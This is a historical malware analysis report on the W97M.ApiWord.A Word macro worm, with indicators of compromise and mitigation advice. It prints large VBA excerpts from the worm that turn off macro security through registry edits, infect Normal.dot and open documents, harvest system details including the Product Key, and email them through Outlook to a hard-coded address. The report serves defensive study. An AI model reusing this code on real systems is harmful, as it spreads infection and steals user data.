# 🛡️ Malware Analysis Report: W97M.ApiWord.A

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--05-blue)
![Malware Type](https://img.shields.io/badge/type-Macro%20Worm%2FWord-red)
![Creation Date](https://img.shields.io/badge/created-2002--05--14-orange)

## Overview

W97M.ApiWord.A is a Microsoft Word macro worm authored by PetiK around May 14, 2002. It abuses Word VBA automation and Windows APIs to persist, collect system/user information, exfiltrate it via email, and spread by infecting documents/templates. It also includes prank-like payloads that manipulate cursor visibility or mouse buttons and can force a system shutdown via the HelpAbout routine.

> Disclaimer: This document is a historical analysis for educational and research purposes only. Do not execute malware outside of a lawful, isolated lab environment.

## Technical details

- Name: W97M.ApiWord.A
- Platform: Windows + Microsoft Word (VBA)
- Language: VBA with Win32 API calls
- Primary vectors: Word document/template infection; email exfiltration (Outlook)

## Execution flow

The main entry point is `AutoOpen`, which runs when an infected document is opened.

```vb
Sub AutoOpen()
slp = Sleep(1000)
winp = Environ("windir")
crd = CreateDirectory(winp + "\ApiSystem", 0)
cp = CopyFile(ActiveDocument.FullName, winp + "\ApiSystem\HelloU.doc", False)

Call endprotect
Call infdoc
Call SrchF
Call PayLoad
End Sub
```

Sequence:
- Creates `\ApiSystem` under `%windir%` and copies the current document to `HelloU.doc`.
- Disables Word macro protections (`endprotect`).
- Infects Normal template and the active document (`infdoc`).
- Collects and exfiltrates system information via Outlook (`SrchF`).
- Executes random payload actions (`PayLoad`).

## Protection bypass

`endprotect` turns off macro prompts and lowers Office security levels via registry edits.

```vb
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Select
WordBasic.DisableAutoMacros 0
```

- Disables macro warnings and allows programmatic access to the VBA project (AccessVBOM).
- Forces AutoMacros to be enabled.

## Document/template infection

`infdoc` ensures the module `ApiWord` exists in both the Normal template and active document, exporting/importing via a drop file.

```vb
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
DropFile = winp + "\ApiSystem\src.txt"
If Nor.Item("ApiWord").Name <> "ApiWord" Then
    Doc("ApiWord").Export DropFile
    Nor.Import DropFile
End If
If Doc.Item("ApiWord").Name <> "ApiWord" Then
    Nor("ApiWord").Export DropFile
    Doc.Import DropFile
    ActiveDocument.Save
End If
```

Effect: persistence via `Normal.dot` infection; cross-infection of opened documents.

## Information collection and exfiltration

`SrchF` gathers system/user metadata and emails it to a hard-coded address with the collected data attached.

```vb
MS = "HKEY_LOCAL_MACHINE\Software\Microsoft\ApiWord"
If System.PrivateProfileString("", MS, "Send Info") <> "OK" Then

CV = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
nom = System.PrivateProfileString("", CV, "RegisteredOwner")
ent = System.PrivateProfileString("", CV, "RegisteredOrganization")
ver = System.PrivateProfileString("", CV, "Version")
vern = System.PrivateProfileString("", CV, "VersionNumber")
pi = System.PrivateProfileString("", CV, "ProductId")
pk = System.PrivateProfileString("", CV, "ProductKey")
pf = System.PrivateProfileString("", CV, "ProgramFilesDir")

sp = System.PrivateProfileString("", _
"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page")

wr = WritePrivateProfileString("Information", "Name", nom, infile)
' ... (other fields) ...

Set out = CreateObject("Outlook.Application")
Set map = out.GetNameSpace("MAPI")
map.Logon "profile", "password"
mel = out.CreateItem(0)
mel.To = "apiinfo@lycos.fr"
mel.Subject = "Mail from " + nom
mel.Attachments.Add (infile)
mel.DeleteafterSubmit = True
mel.Send
map.Logoff

System.PrivateProfileString("", MS, "Send Info") = "OK"
End If
```

Data points:
- Registered owner/organization; Windows version and number; Product ID/Key; Program Files path; IE start page.
- Writes to `%windir%\ApiSystem\AboutU.ini` using `WritePrivateProfileString` and sends it via Outlook.
- Marks completion by setting `HKLM\Software\Microsoft\ApiWord\Send Info = OK`.

## Payload

Randomly performs user-visible actions; `HelpAbout` can force shutdown.

```vb
Sub HelpAbout()
MsgBox "System must be shutdown.", vbCritical, "Warning"
ext = ExitWindowsEx(2, 0)
End Sub
```

```vb
Sub PayLoad()
num = Int((Rnd * 10) + 1)
If num = 1 Then
    sm = SwapMouseButton(&H2)
ElseIf num = 5 Then
    sc = ShowCursor(False)
    slp = Sleep(10000)
    sc = ShowCursor(True)
End If
End Sub
```

- Swap left/right mouse buttons; temporarily hide cursor for ~10 seconds.

## API usage

The module imports several Win32 APIs:

```vb
Private Declare Function Sleep& Lib "kernel32" (ByVal dwReserved As Long)
Private Declare Function CopyFile& Lib "kernel32" Alias "CopyFileA" (...)
Private Declare Function CreateDirectory& Lib "kernel32" Alias "CreateDirectoryA" (...)
Private Declare Function ExitWindowsEx& Lib "user32" (...)
Private Declare Function ShowCursor& Lib "user32" (...)
Private Declare Function SwapMouseButton& Lib "user32" (...)
Private Declare Function WritePrivateProfileString& Lib "kernel32" Alias "WritePrivateProfileStringA" (...)
```

These enable filesystem operations, system modifications, and UI manipulation directly from VBA.

## Indicators of compromise (IoCs)

- Files/directories:
  - `%windir%\ApiSystem\HelloU.doc`
  - `%windir%\ApiSystem\src.txt`
  - `%windir%\ApiSystem\AboutU.ini`
- Registry keys:
  - `HKLM\Software\Microsoft\ApiWord` with values: `Author`, `Info File`, `Name`, `Version`, `Send Info = OK`
  - `HKCU\Software\Microsoft\Office\(9.0|10.0)\Word\Security` modified: `Level`, `AccessVBOM`
- Outlook activity: outbound mail to `apiinfo@lycos.fr` with `AboutU.ini` attached.

## Mitigation

- Disable or restrict macros and programmatic access to the VBA project (AccessVBOM).
- Monitor and block COM automation of Outlook from Office macros.
- Watch for creation of `%windir%\ApiSystem` and the listed files.
- Monitor/restore Word security-related registry values.
- Use up-to-date endpoint protection to detect macro-enabled threats and COM abuse.

## Notes

This worm blends classic Normal.dot infection with data harvesting and exfiltration via Outlook, plus light prank payloads. It is representative of early 2000s macro-malware techniques that abused lax Office security defaults and COM automation.

Analysis date: 2025-11-05
